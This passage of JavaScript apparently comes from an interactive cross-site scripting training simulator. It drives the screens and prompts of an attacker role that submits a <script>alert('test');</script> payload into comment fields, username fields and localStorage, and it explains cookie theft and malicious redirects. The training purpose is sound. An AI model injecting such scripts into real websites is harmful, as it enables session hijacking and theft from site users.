            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-1 -Interactive-Email.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;height:40%;width:50%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:3%;width:70%;font-size:2vw;");

            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Submitting the email and a text comment will store these in the comments webpage database.";
            insideSimulatorAction1 = true;
            XSSAlertScriptSubmitted = false;
            document.getElementById("XSSCheckBoxAttackerReflected").value = "";

            if (!SimZoneSkills1AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:4,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:4,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {

            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";

            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
            const XSSCheckBoxAttackerReflectedVariable = document.getElementById('XSSCheckBoxAttackerReflected');
            const CheckButtonXSSAttackerReflectedVariable = document.getElementById('CheckButtonXSSAttackerReflected');

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-1-Sim-Stored-Script.png";

            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:60%;left:15%;");
            CheckButtonXSSAttackerReflectedVariable.setAttribute("style", "position:fixed;top:60%;left:45%;");


            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:75%;left:5%;background-color: #F4EDCC;width: 70%;font-size: 2vw;");
            simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:35%;left:45%;width: 50%;font-size: 2vw;");

            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "visible";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Submit a script such as '&lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt;' and click the Submit button to observe the result.";
            document.getElementById('simulatorInteractiveText2').innerHTML = "The script &lt;script&gt;alert('test');&lt;/script&gt' is now injected into and stored in the database of the website.";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Submit";
            insideSimulatorAction2 = true;
            XSSAlertScriptSubmitted = false;
            document.getElementById("XSSCheckBoxAttackerReflected").value = "";



            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:4,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:4,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    } else if ((roleId == 0 && (currentLevelNo == 5 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 5 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:50%; height:40%;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:35%;left:71%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:35%;left:30%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-2%;left:40%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:3%;left:51%;");

        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:34%;width: 50%;font-size: 2vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 30%;font-size: 2vw;");

        document.getElementById("circleInteractiveText1").innerHTML = "Victim's HTTP cookies <br> are stolen";
        document.getElementById("circleInteractiveText2").innerHTML = "Victim is redirected to a malicious website";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2 -Interactive.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:15%;width:60%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above actions can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";


        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:5")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:5");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:5");
            addedToSZArray = true;
        }


        if (buttonID == 1) {


            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2-Interactive-Cookies.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:50%;height:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:77%;left:10%;font-size: 2vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('simulatorInteractiveText1').innerHTML = "The victim's HTTP cookies can be sent into the malicious website which puts the victim at risk for a number of attacks, such as taking over of accounts, session highjacking, and unauthorized access to sensitive information.";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:5,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:5,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-2.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;height:40%;width:50%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:10%;font-size: 2vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Redirecting victims to a malicious website significantly increases the risk of a broad spectrum of attacks—from identity theft and financial fraud to malware infections and complete system compromise.";
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:5,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:5,buttonID:12#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }

        }

    } else if ((roleId == 0 && (currentLevelNo == 7 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 7 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:50%; height:40%;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:35%;left:71%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:35%;left:30%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-2%;left:40%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:3%;left:51%;");

        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:34%;width: 50%;font-size: 2vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 30%;font-size: 2vw;");

        document.getElementById("circleInteractiveText1").innerText = "Submit a test script like '<script>alert('test');</script>'";
        document.getElementById("circleInteractiveText2").innerHTML = "Submit a script for an external image";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-1.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('DOMSimImage').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:15%;width:60%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above actions can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";


        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:7")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:7");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:7");
            addedToSZArray = true;
        }


        if (buttonID == 1) {


            const XSSCheckBoxAttackerReflectedVariable = document.getElementById("XSSCheckBoxAttackerReflected");
            const CheckButtonXSSAttackerReflectedVariable = document.getElementById("CheckButtonXSSAttackerReflected");

            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('DOMSimImage').style.visibility = "hidden";


            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:17%;left:38.5%;height:5%;z-index: 1;visibility: visible;");
            CheckButtonXSSAttackerReflectedVariable.setAttribute("style", "position:fixed;top:30%;left:40%;z-index: 1;visibility: visible;");

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-1.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:50%;height:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:77%;left:10%;font-size: 2vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Check";
            document.getElementById('simulatorInteractiveText1').innerText = "Submit a test script like <script>alert(‘test’);</script> and click the Check button to see if JavaScript (JS) can be executed on the webpage";
            insideSimulatorAction1 = true;

            document.getElementById("XSSCheckBoxAttackerReflected").value = "";
            document.getElementById("DOMSimImage").src = "";

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:7,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:7,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {

            const XSSCheckBoxAttackerReflectedVariable = document.getElementById("XSSCheckBoxAttackerReflected");
            const CheckButtonXSSAttackerReflectedVariable = document.getElementById("CheckButtonXSSAttackerReflected");

            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('DOMSimImage').style.visibility = "visible";

            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:17%;left:49%;height:5%;z-index: 1;visibility: visible;");
            CheckButtonXSSAttackerReflectedVariable.setAttribute("style", "position:fixed;top:60%;left:40%;z-index: 1;visibility: visible;");



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-1-Image.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:50%;height:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:10%;font-size: 2vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Check";
            document.getElementById('simulatorInteractiveText1').innerText = "Submit a link to an online image and click the Check button to see if it can be inserted to the webpage";
            insideSimulatorAction2 = true;

            document.getElementById("XSSCheckBoxAttackerReflected").value = "";
            document.getElementById("DOMSimImage").src = "";

            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:7,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:7,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }

        }

    } else if ((roleId == 0 && (currentLevelNo == 8 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 8 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:40%;width:20%; height:20%;visibility:visible;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:35%;left:71%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:35%;left:5%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-2%;left:15%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:3%;left:51%;");

        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:34%;width: 50%;font-size: 2vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 30%;font-size: 2vw;");

        document.getElementById("circleInteractiveText1").innerText = "Submit a test script like <script>alert('test');</script> to localStorage";
        document.getElementById("circleInteractiveText2").innerHTML = "Submit a value to localStorage";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-2-LS.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('DOMSimImage').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:15%;width:60%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above actions can be performed in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";


        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:8")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:8");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:8");
            addedToSZArray = true;
        }


        if (buttonID == 1) {


            const XSSCheckBoxAttackerReflectedVariable = document.getElementById("XSSCheckBoxAttackerReflected");
            const CheckButtonXSSAttackerReflectedVariable = document.getElementById("CheckButtonXSSAttackerReflected");

            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('DOMSimImage').style.visibility = "hidden";


            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:43%;left:48%;height:5%;z-index: 1;visibility: visible;");
            CheckButtonXSSAttackerReflectedVariable.setAttribute("style", "position:fixed;top:60%;right:5%;z-index: 1;visibility: visible;");

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-2-Username-Submit.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:40%;height:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:77%;left:10%;font-size: 2vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Check";
            document.getElementById('simulatorInteractiveText1').innerText = "Submit a test script like <script>alert(‘test’);</script> to the username field and click the Check button to see if JavaScript (JS) can be executed on the webpage";
            insideSimulatorAction1 = true;

            document.getElementById("XSSCheckBoxAttackerReflected").value = "";
            document.getElementById("DOMSimImage").src = "";

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:8,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:8,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {

            const XSSCheckBoxAttackerReflectedVariable = document.getElementById("XSSCheckBoxAttackerReflected");
            const CheckButtonXSSAttackerReflectedVariable = document.getElementById("CheckButtonXSSAttackerReflected");

            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('DOMSimImage').style.visibility = "hidden";

            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:16%;left:50%;height:5%;z-index: 1;visibility: hidden;");
            CheckButtonXSSAttackerReflectedVariable.setAttribute("style", "position:fixed;top:60%;left:40%;z-index: 1;visibility: hidden;");



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-2-Sim-DarkLight.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:50%;height:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:77%;left:10%;font-size: 2vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('simulatorInteractiveText1').innerText = "JavaScript LocalStorage can be used to save user preferences such as language and theme across sessions. These preferences will be saved and loaded when the user visits the website again. ";
            insideSimulatorAction2 = true;

            document.getElementById("XSSCheckBoxAttackerReflected").value = "";
            document.getElementById("DOMSimImage").src = "";

            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:8,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:8,buttonID:12#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }

        }

    } else if ((roleId == 1 && (currentLevelNo == 1 || currentLevelNo == 200)) || ((roleId == 1 && currentLevelNo == 1 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");

        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:23%;left:20%;height:40%;width:50%;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:40%;left:21%;width:25%;height:50%;visibility:visible;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:35%;left:71%;width:25%;height:50%;visibility:visible;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-6%;left:21%;visibility:visible;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:3%;left:51%;visibility:visible;");

